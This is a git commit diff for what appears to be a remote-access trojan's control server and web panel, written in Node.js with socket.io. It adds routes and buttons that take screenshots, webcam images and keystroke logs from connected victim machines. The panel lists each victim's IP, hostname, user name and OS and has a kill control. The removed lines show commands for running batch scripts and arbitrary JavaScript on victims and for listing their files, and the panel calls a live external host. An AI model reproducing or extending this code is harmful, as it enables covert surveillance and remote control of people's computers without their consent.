08d07414bd48c77503d71a804b8246e0f118f77b
CallMeKitsu <89200698+CallMeKitsu@users.noreply.github.com>
2023-01-28 12:21:06 +0000

    added /webcam and /keylog on UI

--- index.js
+++ index.js
@@ -22,20 +22,18 @@ app.use('/', express.static('public'))
 app.use('/cdn', express.static('assets'))
 
 const server = app.listen(3000)
-const io = new Server(server);
+const io = new Server(server)
 
-let socket_id = "none"
-let konsole = new Konsole()
-konsole.socket = socket_id
-let socket_infos = new Map()
+let socket_infos = []
 
 function freshData() {
+  
   app.use('/sockets', (req, res) => {
     res.set('Content-Type', 'application/json');
-    let data = Array.from(socket_infos)
-    let string = JSON.stringify(data)
+    let string = JSON.stringify(socket_infos)
     res.send(Buffer.from(string));
   })
+  
 }
 
 function getSocketById(id) {
@@ -49,99 +47,67 @@ function getSocketById(id) {
 }
 
 app.get('/do/screenshot/:socketId', (req, res) => {
+  
   res.set('Content-Type', 'application/json');
   io.to(req.params.socketId).emit('screen')
   let socket = getSocketById(req.params.socketId)
   
-  if (socket === false) {
-    res.status(400);
-    return
-  }
+  if (socket === false) { res.status(400); return }
   
   socket.on("image", (buffer) => {
     res.send(Buffer.from(JSON.stringify({
       base64: `data:image/png;base64, ${buffer.toString('base64')}`
-    })));
-    socket.off("image")
+    })))
+    res.end()
   })
+
+})
+
+app.get('/do/webcam/:socketId', (req, res) => {
   
+  res.set('Content-Type', 'application/json');
+  io.to(req.params.socketId).emit('cam')
+  let socket = getSocketById(req.params.socketId)
+  
+  if (socket === false) { res.status(400); return }
+  
+  socket.on("image", (buffer) => {
+    res.send(Buffer.from(JSON.stringify({
+      base64: `data:image/png;base64, ${buffer.toString('base64')}`
+    })))
+    res.end()
+  })
+
+})
+
+app.get('/do/keylog/:socketId', (req, res) => {
+  
+  res.set('Content-Type', 'application/json');
+  io.to(req.params.socketId).emit('keylog')
+  let socket = getSocketById(req.params.socketId)
+  
+  if (socket === false) { res.status(400); return }
+  
+  socket.on("out_keylog", (array) => {
+    
+    res.send(Buffer.from(JSON.stringify({
+      rawtext: array.filter(x => x.length === 1 || x === "ENTER" || x === "SPACE").join('').replaceAll('SPACE', " ").replaceAll('ENTER', '\n\n').toLowerCase()
+    })))
+    
+    res.end()
+  })
+
 })
 
 io.on('connection', socket => {
 
   io.to(socket.id).emit('info')
   
-  if (socket_id === "none") {
-    socket_id = socket.id
-    konsole.socket = socket.id
-  }
-  
-  socket.on('response', message => {
-    konsole.log(message)
-  })
-  
-  socket.on('out_keylog', array => {
-    let string = array.filter(x => x.length === 1 || x === "ENTER" || x === "SPACE").join('').replaceAll('SPACE', " ").replaceAll('ENTER', '\n\n').toLowerCase()
-    fs.writeFileSync(`keylogs/keylog_${socket.id}.txt`, string)
-  })
-  
   socket.on('socket_info', infos => {
-    socket_infos.set(socket.id, infos)
+    infos.id = socket.id
+    socket_infos.push(infos)
   })
   
-  socket.on('error', message => {
-    konsole.error(message)
-  })
-  
-  socket.on('warn', message => {
-    konsole.warn(message)
-  })
-  
-  socket.on('givefiles', function(filesArr) {
-    console.log("\n" + new Tree({ sequence: filesArr, baseIndent: " " }).string.blue)
-  })
-})
-
-// commands Map Settings & Definitions
-
-let commands = new Map()
-
-commands.set('bat', async function(str) {
-  io.to(socket_id).emit('bat', str)
-  konsole.startCD(2)
-})
-
-commands.set('kill', function() {
-  io.to(socket_id).emit('kill')
-  konsole.log('Socket correctement fermé.')
-})
-
-commands.set('info', function() {
-  io.to(socket_id).emit('info')
-})
-
-commands.set('keylog', function() {
-  io.to(socket_id).emit('keylog')
-})
-
-commands.set('tree', function(args = "./") {
-  io.to(socket_id).emit('getfiles', args)
-  konsole.startCD(3)
-})
-
-commands.set('js', function(code) {
-  io.to(socket_id).emit('js', code)
-  konsole.startCD(2)
-})
-
-commands.set('cam', function() {
-  io.to(socket_id).emit('cam')
-  konsole.startCD(2)
-})
-
-commands.set('screen', function() {
-  io.to(socket_id).emit('screen')
-  konsole.startCD(2)
 })
 
 freshData()
--- public/script.js
+++ public/script.js
@@ -1,26 +1,37 @@
+let SOCKETS_N = 0
+
 function display() {
   let sockets = JSON.parse(get('https://gate-serv.kitsuforyou.repl.co/sockets'))
+  SOCKETS_N = sockets.length
   document.querySelector(`#sockets`).innerHTML  = ""
 
   for(let socket of sockets) {
-    let ID = socket[0]
-    let infos = socket[1]
-    document.querySelector(`#sockets`).innerHTML += `<div class="socket" onclick='request("${ID}")'>
-      <span>${ID}</span>
-      <span>${infos.ip}</span>
-      <span>${infos.host}</span>
-      <span>${infos.name}</span>
-      <span>${infos.os}</span>
+    document.querySelector(`#sockets`).innerHTML += `<div class="socket">
+      <span>${socket.id}</span>
+      <span>${socket.ip}</span>
+      <span>${socket.host}</span>
+      <span>${socket.name}</span>
+      <span>${socket.os}</span>
+      <ion-icon name="desktop-filled" onclick="image('${socket.id}', 'screenshot')"></ion-icon>
+      <ion-icon name="camera-filled" onclick="image('${socket.id}', 'webcam')"></ion-icon>
+      <ion-icon name="recepit-filled" onclick="text('${socket.id}', 'keylog')"></ion-icon>
+      <ion-icon name="skull-filled" onclick="kill('${socket.id}')"></ion-icon>
     </div>`
   }
 }
 
 setInterval(() => {
-  display()
+  if(SOCKETS_N != JSON.parse(get('https://gate-serv.kitsuforyou.repl.co/sockets')).length) display()
 }, 1000)
 
-function request(id) {
-  let url = `https://gate-serv.kitsuforyou.repl.co/do/screenshot/${id}`
-  let img = JSON.parse(get(url)).base64 || "assets/404.png"
-  document.querySelector('#render').src = img
+function image(id, method) {
+  let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
+  let img = JSON.parse(get(url)).base64 || "url(assets/404.png)"
+  document.querySelector('#render').innerHTML = `<img id='render-img' src='${img}'>`
+}
+
+function text(id, method) {
+  let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
+  let res = JSON.parse(get(url)).rawtext || "No text found"
+  document.querySelector('#render').innerHTML = `<p class="render-text">${res}</p>`
 }
